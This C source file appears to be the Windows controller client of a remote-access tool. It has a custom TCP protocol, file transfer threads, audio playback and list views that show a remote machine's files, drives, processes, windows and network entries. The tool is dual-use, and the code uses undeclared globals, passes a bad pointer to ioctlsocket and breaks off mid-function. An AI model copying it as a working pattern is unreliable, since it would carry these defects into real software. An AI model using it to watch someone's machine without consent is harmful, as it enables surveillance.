#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <commctrl.h>
#include <shellapi.h>
#include <stdlib.h>
#include <stdio.h>
#include "main.h"
#include "list.h"
#include "tree.h"
#include "plugin.h"
#include "tcp.h"
#include "gui.h"
#include "shared.h"
#include "resource.h"

// Global variables

SOCKET g_hTcpSocket, g_hUdpSocket;
bool g_bConnected, g_bTransferring; //, Processing;
char *LocalFileName;
//char *RecvBuffer, *SendBuffer;
//unsigned long RecvBufSize, SendBufSize;
LARGE_INTEGER g_Frequency;

FileEntry *g_pCurrentList  = NULL;;
int g_iListCount, g_iTotalSize, g_iItemsToCome;
LARGE_INTEGER g_iTiming;
bool g_bCheckingUpdate;

CacheEntry *g_pFileCache;
int g_iCacheCount;

HANDLE g_hFile;

void ProcessBuffer(char *buf)
{
	char *buffer = (char*)malloc(sizeof(char) * (strlen(buf) + 1));
	lstrcpy(buffer, buf);

	char *token;
	char **argv = 0;
	int argc = 0;

    token = strtok(buffer, " ");
	while(token)
	{
		argc++;
		argv = (char **)realloc(argv, sizeof(*argv) * argc);
		argv[argc - 1] = token;

		if (token[strlen(token) + 1] == '"')
		{
			token += strlen(token) + 2;
			token = strtok(0, "\"");

			argc++;
			argv = (char **)realloc(argv, sizeof(*argv) * argc);
			argv[argc - 1] = token;
		}

		token = strtok(0, " ");
	}

	free(argv);
	free(buffer);
}

DWORD WINAPI ReceiveFileThread(LPVOID lpArgs)
{
	HANDLE hFile = ((FILETRANSFERARGS *)lpArgs)->hFile;
	SOCKET hSocket = ((FILETRANSFERARGS *)lpArgs)->hSocket;
	DWORD FileSize = ((FILETRANSFERARGS *)lpArgs)->FileSize;
	DWORD Position;
	DWORD BytesWritten, RecvBytes;
	char Buffer[4096];
	int ret;
	TIMEVAL tm;
	fd_set fs;

	WSAAsyncSelect(hSocket, g_hWnd, 0, 0);
//	ioctlsocket(hSocket, FIONBIO, 0);

	linger lin;
	lin.l_onoff=lin.l_linger=0;

	int opt=1;
	setsockopt(hSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt));
	setsockopt(hSocket, SOL_SOCKET, SO_KEEPALIVE, (char *)&opt, sizeof(opt));
	setsockopt(hSocket, SOL_SOCKET, SO_LINGER, (char *)&lin, sizeof(lin));

	u_long noblock=0;
	ioctlsocket(hSocket, FIONBIO, &noblock);

	free(lpArgs);
	Position = 0;

	FD_ZERO(&fs);
	FD_SET(hSocket, &fs);
	tm.tv_sec = 60;
	tm.tv_usec = 0;

	while (Position < FileSize)
	{
		if (select(0, NULL, &fs, NULL, &tm) > 0) {
			if (FD_ISSET(hSocket, &fs)) {

				if (FileSize-Position >= 4096)
					RecvBytes = 4096;
				else
					RecvBytes = FileSize-Position;

				ret = recv(hSocket, Buffer, RecvBytes, 0);
				if (ret > 0)
				{
					WriteFile(hFile, Buffer, ret, &BytesWritten, NULL);
					Position += ret;
					SetRichText(CON_BROWN, "[%d] ret: %d\r\n", Position * 100 / FileSize, ret);
				}
				else if (ret < 0)
				{
					if (WSAGetLastError() != WSAEWOULDBLOCK)
						goto CleanUp;
					Sleep(0);
				}
			}
		} else 
			goto CleanUp;
	}

CleanUp:
	WSAAsyncSelect(hSocket, g_hWnd, WM_MAINSOCKET, FD_CLOSE | FD_READ | FD_WRITE);
	ioctlsocket(hSocket, FIONBIO, (u_long *)1);
	CloseHandle(hFile);
	gbTransferring = false;
    return 0;
}


DWORD WINAPI SendFileThread(LPVOID lpArgs)
{
	HANDLE hFile = ((FILETRANSFERARGS *)lpArgs)->hFile;
	SOCKET hSocket = ((FILETRANSFERARGS *)lpArgs)->hSocket;
	DWORD FileSize = ((FILETRANSFERARGS *)lpArgs)->FileSize;
	DWORD Position = ((FILETRANSFERARGS *)lpArgs)->Offset;

	DWORD BytesRead, SendBytes;
	BYTE Buffer[4096];
	BYTE *Packet;
	int ret;
	TIMEVAL tm;
	fd_set fs;

	WSAAsyncSelect(hSocket, g_hWnd, 0, 0);
//	ioctlsocket(hSocket, FIONBIO, 0);

	linger lin;
	lin.l_onoff=lin.l_linger=0;

	int opt=1;
	setsockopt(hSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt));
	setsockopt(hSocket, SOL_SOCKET, SO_KEEPALIVE, (char *)&opt, sizeof(opt));
	setsockopt(hSocket, SOL_SOCKET, SO_LINGER, (char *)&lin, sizeof(lin));

	u_long noblock=0;
	ioctlsocket(hSocket, FIONBIO, &noblock);

	free(lpArgs);
	Position = 0;

	FD_ZERO(&fs);
	FD_SET(hSocket, &fs);
	tm.tv_sec = 60;
	tm.tv_usec = 0;

	SetFilePointer(hFile, Position, NULL, FILE_BEGIN);

	while (Position < FileSize)
	{
		ReadFile(hFile, Buffer, 4096, &BytesRead, NULL);
		if (BytesRead > 0)
		{
			Position += BytesRead;
			Packet = Buffer;
			if (select(0, NULL, &fs, NULL, &tm) > 0) {
				if (FD_ISSET(hSocket, &fs)) {
					do
					{
		                if (BytesRead >= 4096)
							SendBytes = 4096;
						else
							SendBytes = BytesRead;
						ret = send(hSocket, (char *)Packet, SendBytes, 0);
						SetRichText(CON_BROWN, "[%d] ret: %d\r\n", Position * 100 / FileSize, ret);
						if (ret > 0)
						{
							BytesRead -= ret;
							Packet += ret;
						}
						else if (ret < 0)
						{
							if (WSAGetLastError() != WSAEWOULDBLOCK)
								goto CleanUp;
							Sleep(0);
						}
					} while (BytesRead > 0);
				}
			} else 
				goto CleanUp;
		}
	}

CleanUp:

	WSAAsyncSelect(hSocket, g_hWnd, WM_MAINSOCKET, FD_CLOSE | FD_READ | FD_WRITE);
	ioctlsocket(hSocket, FIONBIO, (u_long *)1);
	CloseHandle(hFile);
	gbTransferring = false;
	return 0;
}

void ProcessQueue(void)
{
	char *SckData, **data;
	unsigned long Len, Index, datac, i;
	unsigned long *datal;
	unsigned short cmd;

	if (!Processing && RecvBufSize >= 4) {
		Processing = true;

		// Extract 4 byte message length
		memcpy(&Len, RecvBuffer, 4);

		if (RecvBufSize >= Len + 4) {

			// Extract 2 byte command
			memcpy(&cmd, RecvBuffer + 4, 2);

			// Extract 4 byte argument count
			memcpy(&datac, RecvBuffer + 6, 4);

			// Allocate buffers for data
			data = (char **)malloc(datac * sizeof(char *));
			datal = (unsigned long *)malloc(datac * sizeof(unsigned long));
			Len -= 6;
			SckData = (char *)malloc(Len);

			// Copy data from receive buffer
			memcpy(SckData, RecvBuffer + 10, Len);

			// Shift receive buffer to the left			
			RecvBufSize -= Len + 10;
			//memcpy(RecvBuffer, RecvBuffer + Len + 10, RecvBufSize);
			memmove(RecvBuffer, RecvBuffer + Len + 10, RecvBufSize);
			RecvBuffer = (char *)realloc(RecvBuffer, RecvBufSize);

			// Extract arguments
			Index = 0;
			for (i = 0; i < datac; i++) {
				memcpy(&Len, SckData + Index, 4);
				Index += 4;
				datal[i] = Len;
				data[i] = (char *)malloc(Len + 1);
				memcpy(data[i], SckData + Index, Len);
				data[i][Len] = '\0'; // Insert extra null for easy string manipulation
				Index += Len;
			}
			free(SckData);
			Processing = false;
			
			// Parse data
			ParseData(cmd, datac, data, datal);

			// Free memory
			for (i = 0; i < datac; i++)
				free(data[i]);
			free(data);
			free(datal);

			ProcessQueue();
		}
		Processing = false;
	}
}

void SendStr(char *cmd, char *msg)
{
	unsigned long msglen = lstrlen(msg);
	SendData(atoi(cmd), 1, &msg, &msglen);
}


void SendData(unsigned short cmd, unsigned long datac, char **data, unsigned long *datal)
{
	unsigned int Size, Index, i;

	// Calculate total message length
	Size = 6 + datac * 4;
	for (i = 0; i < datac; i++)
		Size += datal[i];

	// Allocate memory for message
	char *SckData = (char *)malloc(Size + 4); // (+ 4 to compensate for message length header)
	
	memcpy(SckData, &Size, 4); // Insert 4 byte message length	
	memcpy(SckData + 4, &cmd, 2); // Insert 2 byte command	
	memcpy(SckData + 6, &datac, 4); // Insert 4 byte argument count

	// Insert arguments
	Index = 10;
	for (i = 0; i < datac; i++) {
		memcpy(SckData + Index, &datal[i], 4);
		Index += 4;
		memcpy(SckData + Index, data[i], datal[i]);
		Index += datal[i];
	}

	if (SendBufSize == 0) {

		// Add data to send buffer, and try to send

		SendBufSize = Size + 4; // (+ 4 to compensate for message length header)
		SendBuffer = (char *)realloc(SendBuffer, SendBufSize);
		memcpy(SendBuffer, SckData, SendBufSize);

		int len = send(g_hTcpSocket, SendBuffer, SendBufSize, 0);

		if (len > 0) {
			SendBufSize -= len;
			memmove(SendBuffer, SendBuffer + len, SendBufSize);
			SendBuffer = (char *)realloc(SendBuffer, SendBufSize);
		}
	} 
	else {

		// Add data to send buffer, FD_WRITE messages
		// will handle the rest

		SendBufSize += Size + 4; // (+ 4 to compensate for message length header)
		SendBuffer = (char *)realloc(SendBuffer, SendBufSize);
		memcpy(SendBuffer + SendBufSize - Size - 4, SckData, Size + 4);
	}

	// Free memory
	free(SckData);
}

WAVEFORMATEX    g_wave_format;
HWAVEOUT        g_wave_out;
WAVEHDR         g_header[4];
char            g_buffer[4*4096];
int             g_pointer = 0;
int             buffering = 0;



void CALLBACK wave_out_proc(HWAVEOUT wave_out, UINT msg, DWORD_PTR dwInstance, DWORD_PTR dwParam1, DWORD_PTR dwParam2)
{
	int error;
	switch (msg)
	{
	case WOM_DONE:
		WAVEHDR* hdr = (WAVEHDR*) dwParam1;
		waveOutUnprepareHeader(g_wave_out, hdr, sizeof(WAVEHDR));
		break;

	}
}

void initialize_wave(int quality)
{
	//printf("initializing wave out %d",quality);
	buffering = 8;

	waveOutClose(g_wave_out);

	g_wave_format.wFormatTag = WAVE_FORMAT_PCM;
	g_wave_format.nChannels = 1;
	g_wave_format.nSamplesPerSec = quality;
	g_wave_format.nAvgBytesPerSec = quality;
	g_wave_format.wBitsPerSample = 8;
	g_wave_format.nBlockAlign = 1;

	for (int i=0; i<4;i++)
	{
		WAVEHDR* hdr = g_header+i;
		hdr->lpData = g_buffer+i*4096;
		hdr->dwBufferLength = 4096;
		hdr->dwFlags = 0;
	}
	waveOutOpen(&g_wave_out, WAVE_MAPPER /*or replace with your preferred wave out device*/, &g_wave_format, (DWORD_PTR) wave_out_proc, 0, CALLBACK_FUNCTION);    


	//waveOutStart(g_wave_out);
}

void wave_add_data(char* pdata)
{
	//if (WaitForSingleObject(g_mutex, 5000L)) return;
	char* to = g_buffer+g_pointer*4096;
	memcpy(to, pdata, 4096);

	if (buffering > 0) 
	{
		buffering--;
		waveOutPause(g_wave_out);
		waveOutReset(g_wave_out);
	}
	if (buffering == 0)
	{
		waveOutRestart(g_wave_out);
		buffering = -1;
	}
	(g_header+g_pointer)->dwFlags = 0;
	waveOutPrepareHeader(g_wave_out, g_header+g_pointer, sizeof(WAVEHDR));
	waveOutWrite(g_wave_out, g_header+g_pointer, sizeof(WAVEHDR));

	g_pointer++;
	g_pointer %= 4;

}

void ParseData(unsigned short cmd, unsigned long datac, char **data, unsigned long *datal)
{
	int i, j;

	unsigned long DirArray[3];
	unsigned int DriveArray[5];
	unsigned int ProcArray[3];
	unsigned int WindowArray[2];
	unsigned int AppArray[2];
	unsigned int NetArray[2];
	char *WinInfoData[4];
	unsigned long WinInfoLen[4];
	unsigned int WinInfoArray[4];
	char WindowText[99], ParentText[99], WindowClass[99];

	if (datac > 0) {
		for (i=0; i<(int)datac; i++)
		{
			if ((cmd == 7) && (i == 1))
			{
				memcpy(DirArray, data[1], datal[1]);
				SetRichText(CON_RED, "da0[%d] da1[%d] da2[%d]\r\n", DirArray[0], DirArray[1], DirArray[2]);
			}
			else if ((cmd == 11) && (i == 1))
			{
				memcpy(DriveArray, data[3], datal[3]);
				SetRichText(CON_RED, "0[%d] 1[%d] 2[%d] 3[%d] 4[%d]\r\n", DriveArray[0], DriveArray[1], DriveArray[2], DriveArray[3], DriveArray[4]);
			}
			else if ((cmd == 33))
			{
				wsprintf(WindowText, "%s", data[0]);
				wsprintf(WindowClass, "%s", data[1]);
				wsprintf(ParentText, "%s", data[2]);
				//memcpy(WindowText, data[0], datal[0]);
				//memcpy(WindowClass, data[1], datal[1]);
				//memcpy(ParentText, data[2], datal[2]);
				memcpy(WinInfoArray, data[3], datal[3]);
				SetRichText(CON_RED, "wt[%s] wc[%s] pt[%s] h[%d] hp[%d] s[%d] es[%d]\r\n", WindowText, WindowClass, ParentText, WinInfoArray[0], WinInfoArray[1], WinInfoArray[2], WinInfoArray[3]);
			}
			else if ((cmd == 302) || (cmd == 303))
			{
				SetRichText(CON_GREEN, "cmd[%i] data[%i]: %i\r\n", cmd, i, lstrlen(data[i]));
			}
			else
			{
				SetRichText(CON_GREEN, "cmd[%i] data[%i]: %s\r\n", cmd, i, data[i]);
			}
		}
	}
	else {
		SetRichText(CON_GREEN, "cmd[%i]\r\n", cmd);
	}

	switch (cmd) {
		case 8:
		{
			// Clear listview contents

			SendMessage(hListView, WM_SETREDRAW, FALSE, 0);
			ListView_DeleteAllItems(hListView);
			SendMessage(hListView, WM_SETREDRAW, TRUE, 0);

			// Set current path
			
			strcpy(g_szCurrentPath, data[0]);
			//g_szCurrentPath[strlen(g_szCurrentPath) - 3] = 0;

			// Clear the file list

			g_pCurrentList = 0;
			g_iListCount = 0;
			g_iTotalSize = 0;
//			g_iItemsToCome = *(unsigned long *)data[1];
//			g_iTiming = *(LARGE_INTEGER *)data[0];
			QueryPerformanceCounter(&g_iTiming);
			break;
		}
		case 7:
		{			
			// Add this item to the array
			g_iListCount++;
			g_pCurrentList = (FileEntry *)realloc(g_pCurrentList, g_iListCount * sizeof(FileEntry));

			g_pCurrentList[g_iListCount - 1].FileName = strdup(data[0]);
			if (datac == 2) {
				memcpy(&g_pCurrentList[g_iListCount - 1].Data, data[1], datal[1]);
				g_iTotalSize += g_pCurrentList[g_iListCount - 1].Data[1];
			}

			// Update progress
			char ItemBuffer[1024], SizeBuffer[1024];

			wsprintf(SizeBuffer, "%s", FileSizeString(SizeBuffer, g_iTotalSize));
			wsprintf(ItemBuffer, "%d items (%s)", g_iListCount, SizeBuffer);
			SendMessage(g_hStatus, SB_SETTEXT, 0, (LPARAM)ItemBuffer);

//			wsprintf(ItemBuffer, "Downloading list... %d%%", 100 * 
//				g_iListCount / g_iItemsToCome);
//			SendMessage(g_hStatus, SB_SETTEXT, 1, (LPARAM)ItemBuffer);

			break;
		}
		case 9:
		{
			// Add this to cache

			bool Found = false;
			MD5_CTX ctx;

			for (i = 0; i < g_iCacheCount; i++)
			{
				if (strcmp(g_pFileCache[i].Directory, g_szCurrentPath) == 0)
				{
					// A cache entry for this directory already exists,
					// lets overwrite it

					free(g_pFileCache[i].FileList);
					g_pFileCache[i].FileList = g_pCurrentList;
					g_pFileCache[i].ListCount = g_iListCount;

					// Calculate MD5 checksum of this entry

					memset(g_pFileCache[i].CRC, 0, sizeof(g_pFileCache[i].CRC));
					MD5Init(&ctx);

					for (j = 0; j < g_iListCount; j++)
					{
						MD5Update(&ctx, (unsigned char *)g_pCurrentList[j].FileName, 
							(int)strlen(g_pCurrentList[j].FileName));
						MD5Update(&ctx, (unsigned char *)g_pCurrentList[j].Data,
							sizeof(g_pCurrentList[j].Data));
					}

					MD5Final(g_pFileCache[i].CRC, &ctx);

					Found = true;
					break;
				}
			}

			if (!Found)
			{
				// No cache for this directory yet, create new one

				g_pFileCache = (CacheEntry *)realloc(g_pFileCache, ++g_iCacheCount *
					sizeof(*g_pFileCache));

				g_pFileCache[g_iCacheCount - 1].Directory = strdup(g_szCurrentPath);
				g_pFileCache[g_iCacheCount - 1].FileList = g_pCurrentList;
				g_pFileCache[g_iCacheCount - 1].ListCount = g_iListCount;
				
				// Calculate MD5 checksum of this entry

				memset(g_pFileCache[g_iCacheCount - 1].CRC, 0, 
					sizeof(g_pFileCache[g_iCacheCount - 1].CRC));
				MD5Init(&ctx);

				for (j = 0; j < g_iListCount; j++)
				{
					MD5Update(&ctx, (unsigned char *)g_pCurrentList[j].FileName, 
						(int)strlen(g_pCurrentList[j].FileName));
					MD5Update(&ctx, (unsigned char *)g_pCurrentList[j].Data,
						sizeof(g_pCurrentList[j].Data));
				}

				MD5Final(g_pFileCache[g_iCacheCount - 1].CRC, &ctx);
			}
			else
			{
				UpdateListing(g_szCurrentPath, false);
				return;
			}

			// Display directory list in listview

			SendMessage(g_hStatus, SB_SETTEXT, 1, (LPARAM)"Displaying...");

			SHFILEINFO FileInfo;
			LVITEM Item;
			DWORD TotalSize;
			char SizeBuf[1024];

			SendMessage(hListView, WM_SETREDRAW, FALSE, 0);

			Item.mask = LVIF_IMAGE | LVIF_TEXT | LVIF_PARAM;
			Item.iSubItem = 0;
			TotalSize = 0;

			for (i = 0; i < g_iListCount; i++)
			{
				// Get correct system icon index

				if ((g_pCurrentList[i].Data[2] & FILE_ATTRIBUTE_DIRECTORY) > 0)
				{
					HIMAGELIST himglist=(HIMAGELIST)SHGetFileInfo(0,0,&FileInfo,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
					ListView_SetImageList(hListView, himglist, LVSIL_SMALL);
					SHGetFileInfo("C:\\*.*", 0, &FileInfo, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
					Item.iImage = FileInfo.iIcon;
				}
				else
				{
					HIMAGELIST ipSmallSystemImageList = (HIMAGELIST)SHGetFileInfo(FileExtension(g_pCurrentList[i].FileName), 0, 
						&FileInfo, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON | SHGFI_USEFILEATTRIBUTES);
					SendMessage(hListView, LVM_SETIMAGELIST, LVSIL_SMALL, (LPARAM)ipSmallSystemImageList);
					Item.iImage = FileInfo.iIcon;
				}

				Item.iItem = i;
				Item.lParam = (LPARAM)&g_pCurrentList[i];
				Item.pszText = g_pCurrentList[i].FileName;
				
				ListView_InsertItem(hListView, &Item);

				// Add size subitem

				if ((g_pCurrentList[i].Data[2] & FILE_ATTRIBUTE_DIRECTORY) == 0)
				{
					wsprintf(SizeBuf, "%s", FileSizeString(SizeBuf, g_pCurrentList[i].Data[1]));
					//wsprintf(SizeBuf, "%i", g_pCurrentList[i].Data[1]);
					ListView_SetItemText(hListView, i, 1, SizeBuf);
				}

				TotalSize += g_pCurrentList[i].Data[1];

				// Add attributes subitem

				FileAttributesString(g_pCurrentList[i].Data[2], SizeBuf);
				trim(SizeBuf);
				ListView_SetItemText(hListView, i, 2, SizeBuf);
			}

			ListView_SortItems(hListView, CompareFunc, 0);
			SendMessage(hListView, WM_SETREDRAW, TRUE, 0);

			// Crude workaround to scrollbar screwing up sizing

			RECT Rect;

			GetClientRect(hListView, &Rect);
			ListView_SetColumnWidth(hListView, 0, Rect.right - Rect.left - 
				SIZE_COLUMN_WIDTH - ATTR_COLUMN_WIDTH);

			// Calculate time taken

			LARGE_INTEGER t;
			char buf[1024];

			QueryPerformanceCounter(&t);

			wsprintf(SizeBuf, "%s", FileSizeString(SizeBuf, TotalSize));
			//wsprintf(SizeBuf, "%d", TotalSize);
			wsprintf(buf, "%d items (%s)", g_iListCount, SizeBuf);
			SendMessage(g_hStatus, SB_SETTEXT, 0, (LPARAM)(char *)buf);

			sprintf(buf, "Updated in %.3f seconds.", (float)(t.QuadPart - 
				g_iTiming.QuadPart) / g_Frequency.QuadPart);

			SendMessage(g_hStatus, SB_SETTEXT, 1, (LPARAM)(char *)buf);

			break;
		}
		case 10:
		{
			SetRichText(CON_RED, "Error: Unable to access directory.");
			break;
		}
		case 11:
		{
			if (datac != 4)
			{
				// Clear listview contents

				SendMessage(hListView, WM_SETREDRAW, FALSE, 0);
				ListView_DeleteAllItems(hListView);
				SendMessage(hListView, WM_SETREDRAW, TRUE, 0);

				// Set current path
			
				strcpy(g_szCurrentPath, "");
			}
			else if (datac == 4)
			{
				// Display drive list in listview

				SendMessage(g_hStatus, SB_SETTEXT, 1, (LPARAM)"Displaying...");

				SHFILEINFO FileInfo;
				LVITEM Item;

				SendMessage(hListView, WM_SETREDRAW, FALSE, 0);

				Item.mask = LVIF_IMAGE | LVIF_TEXT | LVIF_PARAM;
				Item.iSubItem = 0;

				HIMAGELIST himglist=(HIMAGELIST)SHGetFileInfo(0,0,&FileInfo,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
				ListView_SetImageList(hListView, himglist, LVSIL_SMALL);
				SHGetFileInfo(data[0], 0, &FileInfo, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
				Item.iImage = FileInfo.iIcon;

				Item.iItem = 0;
				Item.lParam = (LPARAM)&data[0];
				Item.pszText = data[0];
				
				ListView_InsertItem(hListView, &Item);

				char Units[MAX_PATH];
				memcpy(DriveArray, data[3], datal[3]);

				switch (DriveArray[0])
				{
				case DRIVE_RAMDISK:
					strcpy((char *)Units, "RAMDISK");
					break;
				case DRIVE_CDROM:
					strcpy((char *)Units, "CDROM");
					break;
				case DRIVE_REMOTE:
					strcpy((char *)Units, "REMOTE");
					break;
				case DRIVE_FIXED:
					strcpy((char *)Units, "FIXED");
					break;
				case DRIVE_REMOVABLE:
					strcpy((char *)Units, "REMOVABLE");
					break;
				case DRIVE_NO_ROOT_DIR:
					strcpy((char *)Units, "NO_ROOT_DIR");
					break;
				default:
					strcpy((char *)Units, "UNKNOWN");
					break;
				}

				ListView_SetItemText(hListView, 0, 1, (LPSTR)Units);
				ListView_SetItemText(hListView, 0, 2, (LPSTR)data[2]);

				SendMessage(hListView, WM_SETREDRAW, TRUE, 0);
			}
		break;
		}

		case 23:
		{
			// Clear listview contents
			SendMessage(hListView, WM_SETREDRAW, FALSE, 0);
			ListView_DeleteAllItems(hListView);
			SendMessage(hListView, WM_SETREDRAW, TRUE, 0);
			break;
		}
		case 22:
		{
			if (datac == 2)
			{
				SendMessage(g_hStatus, SB_SETTEXT, 1, (LPARAM)"Displaying...");

				SHFILEINFO FileInfo;
				LVITEM Item;
				char SizeBuf[1024];

				SendMessage(hListView, WM_SETREDRAW, FALSE, 0);

				Item.mask = LVIF_IMAGE | LVIF_TEXT | LVIF_PARAM;
				Item.iSubItem = 0;

				HIMAGELIST himglist=(HIMAGELIST)SHGetFileInfo(0,0,&FileInfo,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
				ListView_SetImageList(hListView, himglist, LVSIL_SMALL);
				SHGetFileInfo(data[0], 0, &FileInfo, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
				Item.iImage = FileInfo.iIcon;

				Item.iItem = 0;
				Item.lParam = (LPARAM)&data[0];
				Item.pszText = data[0];
				
				ListView_InsertItem(hListView, &Item);

				memcpy(ProcArray, data[1], datal[1]);

				wsprintf(SizeBuf, "%d", ProcArray[0]);
				ListView_SetItemText(hListView, 0, 1, (LPSTR)SizeBuf);
				wsprintf(SizeBuf, "%d", ProcArray[1]);
				ListView_SetItemText(hListView, 0, 2, (LPSTR)SizeBuf);
				wsprintf(SizeBuf, "%d", ProcArray[2]);
				ListView_SetItemText(hListView, 0, 3, (LPSTR)SizeBuf);

				SendMessage(hListView, WM_SETREDRAW, TRUE, 0);
			}
		break;
		}
		case 27:
		{
			// Clear listview contents
			SendMessage(hListView, WM_SETREDRAW, FALSE, 0);
			ListView_DeleteAllItems(hListView);
			SendMessage(hListView, WM_SETREDRAW, TRUE, 0);
			break;
		}
		case 26:
		{
			if (datac == 2)
			{
				SendMessage(g_hStatus, SB_SETTEXT, 1, (LPARAM)"Displaying...");

				SHFILEINFO FileInfo;
				LVITEM Item;
				char SizeBuf[1024];

				SendMessage(hListView, WM_SETREDRAW, FALSE, 0);

				Item.mask = LVIF_IMAGE | LVIF_TEXT | LVIF_PARAM;
				Item.iSubItem = 0;

				HIMAGELIST himglist=(HIMAGELIST)SHGetFileInfo(0,0,&FileInfo,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
				ListView_SetImageList(hListView, himglist, LVSIL_SMALL);
				SHGetFileInfo(data[0], 0, &FileInfo, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
				Item.iImage = FileInfo.iIcon;

				Item.iItem = 0;
				Item.lParam = (LPARAM)&data[0];
				Item.pszText = data[0];
				
				ListView_InsertItem(hListView, &Item);

				memcpy(WindowArray, data[1], datal[1]);

				wsprintf(SizeBuf, "%d", WindowArray[0]);
				ListView_SetItemText(hListView, 0, 1, (LPSTR)SizeBuf);
				wsprintf(SizeBuf, "%d", WindowArray[1]);
				ListView_SetItemText(hListView, 0, 2, (LPSTR)SizeBuf);

				SendMessage(hListView, WM_SETREDRAW, TRUE, 0);
			}
		break;
		}
		case 31:
		{
			// Clear listview contents
			SendMessage(hListView, WM_SETREDRAW, FALSE, 0);
			ListView_DeleteAllItems(hListView);
			SendMessage(hListView, WM_SETREDRAW, TRUE, 0);
			break;
		}
		case 30:
		{
			if (datac == 2)
			{
				SendMessage(g_hStatus, SB_SETTEXT, 1, (LPARAM)"Displaying...");

				SHFILEINFO FileInfo;
				LVITEM Item;
				char SizeBuf[1024];

				SendMessage(hListView, WM_SETREDRAW, FALSE, 0);

				Item.mask = LVIF_IMAGE | LVIF_TEXT | LVIF_PARAM;
				Item.iSubItem = 0;

				HIMAGELIST himglist=(HIMAGELIST)SHGetFileInfo(0,0,&FileInfo,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
				ListView_SetImageList(hListView, himglist, LVSIL_SMALL);
				SHGetFileInfo(data[0], 0, &FileInfo, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
				Item.iImage = FileInfo.iIcon;

				Item.iItem = 0;
				Item.lParam = (LPARAM)&data[0];
				Item.pszText = data[0];
				
				ListView_InsertItem(hListView, &Item);

				memcpy(AppArray, data[1], datal[1]);

				wsprintf(SizeBuf, "%d", AppArray[0]);
				ListView_SetItemText(hListView, 0, 1, (LPSTR)SizeBuf);
				wsprintf(SizeBuf, "%d", AppArray[1]);
				ListView_SetItemText(hListView, 0, 2, (LPSTR)SizeBuf);

				SendMessage(hListView, WM_SETREDRAW, TRUE, 0);
			}
		break;
		}
		case 36:
		{
			// Clear listview contents
			SendMessage(hListView, WM_SETREDRAW, FALSE, 0);
			ListView_DeleteAllItems(hListView);
			SendMessage(hListView, WM_SETREDRAW, TRUE, 0);
			break;
		}
		case 35:
		{
			if (datac == 2)
			{
				SendMessage(g_hStatus, SB_SETTEXT, 1, (LPARAM)"Displaying...");

				SHFILEINFO FileInfo;
				LVITEM Item;
				char SizeBuf[1024];

				SendMessage(hListView, WM_SETREDRAW, FALSE, 0);

				Item.mask = LVIF_IMAGE | LVIF_TEXT | LVIF_PARAM;
				Item.iSubItem = 0;

				HIMAGELIST himglist=(HIMAGELIST)SHGetFileInfo(0,0,&FileInfo,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
				ListView_SetImageList(hListView, himglist, LVSIL_SMALL);
				SHGetFileInfo(data[0], 0, &FileInfo, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
				Item.iImage = FileInfo.iIcon;

				Item.iItem = 0;
				Item.lParam = (LPARAM)&data[0];
				Item.pszText = data[0];
				
				ListView_InsertItem(hListView, &Item);

				memcpy(NetArray, data[1], datal[1]);

				wsprintf(SizeBuf, "%d", NetArray[0]);
				ListView_SetItemText(hListView, 0, 1, (LPSTR)SizeBuf);
				wsprintf(SizeBuf, "%d", NetArray[1]);
				ListView_SetItemText(hListView, 0, 2, (LPSTR)SizeBuf);

				SendMessage(hListView, WM_SETREDRAW, TRUE, 0);
			}
		break;
		}

		case 43:
		{
			// Clear listview contents
			SendMessage(hListView, WM_SETREDRAW, FALSE, 0);
			ListView_DeleteAllItems(hListView);
			SendMessage(hListView, WM_SETREDRAW, TRUE, 0);
			break;
		}
		case 44:
		{
			if (datac == 1)
			{
				SendMessage(g_hStatus, SB_SETTEXT, 1, (LPARAM)"Displaying...");

				SHFILEINFO FileInfo;
				LVITEM Item;
				char SizeBuf[1024];

				SendMessage(hListView, WM_SETREDRAW, FALSE, 0);

				Item.mask = LVIF_IMAGE | LVIF_TEXT | LVIF_PARAM;
				Item.iSubItem = 0;

				HIMAGELIST himglist=(HIMAGELIST)SHGetFileInfo(0,0,&FileInfo,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
				ListView_SetImageList(hListView, himglist, LVSIL_SMALL);
				SHGetFileInfo(data[0], 0, &FileInfo, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
				Item.iImage = FileInfo.iIcon;

				Item.iItem = 0;
				Item.lParam = (LPARAM)&data[0];
				Item.pszText = data[0];
				
				ListView_InsertItem(hListView, &Item);

//				memcpy(NetArray, data[1], datal[1]);

//				wsprintf(SizeBuf, "%d", NetArray[0]);
//				ListView_SetItemText(hListView, 0, 1, (LPSTR)SizeBuf);
//				wsprintf(SizeBuf, "%d", NetArray[1]);
//				ListView_SetItemText(hListView, 0, 2, (LPSTR)SizeBuf);

				SendMessage(hListView, WM_SETREDRAW, TRUE, 0);
			}
		break;
		}
		case 45:
		{
			if (datac == 1)
			{
				SendMessage(g_hStatus, SB_SETTEXT, 1, (LPARAM)"Displaying...");

				SHFILEINFO FileInfo;
				LVITEM Item;
				char SizeBuf[1024];

				SendMessage(hListView, WM_SETREDRAW, FALSE, 0);

				Item.mask = LVIF_IMAGE | LVIF_TEXT | LVIF_PARAM;
				Item.iSubItem = 0;

				HIMAGELIST himglist=(HIMAGELIST)SHGetFileInfo(0,0,&FileInfo,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
